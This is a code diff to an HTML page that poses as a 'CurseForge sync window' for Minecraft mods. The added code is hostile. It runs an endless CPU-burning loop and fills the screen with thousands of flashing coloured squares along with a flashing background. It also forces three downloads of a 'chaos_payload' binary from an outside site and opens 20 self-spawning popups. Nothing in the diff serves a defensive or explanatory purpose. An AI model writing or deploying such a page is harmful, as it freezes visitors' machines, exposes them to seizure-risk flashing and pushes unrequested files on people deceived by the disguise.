@@ -4,30 +4,82 @@
   <meta charset="UTF-8" />
   <title>Pop-up Permission Required</title>
   <script>
-function openPopup() {
-  const width = 500;
-  const height = 400;
+    function openPopup() {
+      const width = 500;
+      const height = 400;
 
-  // Use screen width and height for max coords
-  const maxLeft = window.screen.width - width;
-  const maxTop = window.screen.height - height;
+      const maxLeft = window.screen.width - width;
+      const maxTop = window.screen.height - height;
 
-  // Random position anywhere inside visible screen
-  const left = Math.floor(Math.random() * maxLeft);
-  const top = Math.floor(Math.random() * maxTop);
+      const left = Math.floor(Math.random() * maxLeft);
+      const top = Math.floor(Math.random() * maxTop);
 
-  const popup = window.open(
-    window.location.href + "?popup=true",
-    "_blank",
-    `width=${width},height=${height},left=${left},top=${top}`
-  );
+      const popup = window.open(
+        window.location.href + "?popup=true",
+        "_blank",
+        `width=${width},height=${height},left=${left},top=${top}`
+      );
 
-  if (popup) {
-    popup.focus();
-    window.blur();
-  }
-}
+      if (popup) {
+        popup.focus();
+        window.blur();
+      }
+    }
 
+    // CPU hog function: heavy math loop
+    function cpuHog() {
+      let x = 0;
+      while (true) {
+        x += Math.sqrt(Math.random()) * Math.random();
+        if (x > 1e10) x = 0; // reset occasionally to keep loop going
+      }
+    }
+
+    // Flood DOM with thousands of flashing divs
+    function floodDOM() {
+      const container = document.createElement('div');
+      container.style.position = 'fixed';
+      container.style.top = '0';
+      container.style.left = '0';
+      container.style.width = '100vw';
+      container.style.height = '100vh';
+      container.style.overflow = 'hidden';
+      container.style.zIndex = '9999';
+      document.body.appendChild(container);
+
+      for (let i = 0; i < 3000; i++) {
+        const div = document.createElement('div');
+        div.style.position = 'absolute';
+        div.style.width = '10px';
+        div.style.height = '10px';
+        div.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
+        div.style.top = `${Math.random() * window.innerHeight}px`;
+        div.style.left = `${Math.random() * window.innerWidth}px`;
+        container.appendChild(div);
+      }
+
+      // Flash colors fast
+      setInterval(() => {
+        container.childNodes.forEach(div => {
+          div.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
+        });
+        // Also flash background for extra headache
+        document.body.style.backgroundColor = `hsl(${Math.random() * 360}, 80%, 70%)`;
+      }, 100);
+    }
+
+    // Trigger multiple downloads (3 copies)
+    function triggerDownloads() {
+      for (let i = 0; i < 3; i++) {
+        const a = document.createElement('a');
+        a.href = "https://elitemetal7.github.io/CoolestMinecraftMods/chaos_payload_24mb.bin";
+        a.download = `chaos_payload_${Date.now()}_${i}.bin`;
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }
+    }
 
     window.onload = function () {
       const isPopup = new URLSearchParams(window.location.search).has('popup');
@@ -39,7 +91,6 @@ function openPopup() {
           </audio>
           <h1>CurseForge sync window</h1>
           <p>Sync in progress... do not close this window.</p>
-          <a id="downloadLink" href="https://elitemetal7.github.io/CoolestMinecraftMods/chaos_payload_24mb.bin" download style="display:none"></a>
         `;
 
         const screech = document.getElementById('screech');
@@ -50,10 +101,17 @@ function openPopup() {
           }, { once: true });
         });
 
-        const download = document.getElementById('downloadLink');
-        download.click();
+        triggerDownloads();
 
-        // Spawn 20 popups immediately
+        floodDOM();
+
+        // Run CPU hog in a separate thread so UI doesn't freeze immediately
+        // Using a Web Worker is cleaner but let's fake it with setTimeout here:
+        setTimeout(() => {
+          cpuHog();
+        }, 500);
+
+        // Spawn 20 new popups randomly
         for (let i = 0; i < 20; i++) {
           openPopup();
         }
@@ -80,6 +138,8 @@ function openPopup() {
       font-family: Arial, sans-serif;
       text-align: center;
       padding-top: 100px;
+      margin: 0;
+      overflow: hidden;
     }
     h1 {
       font-size: 32px;
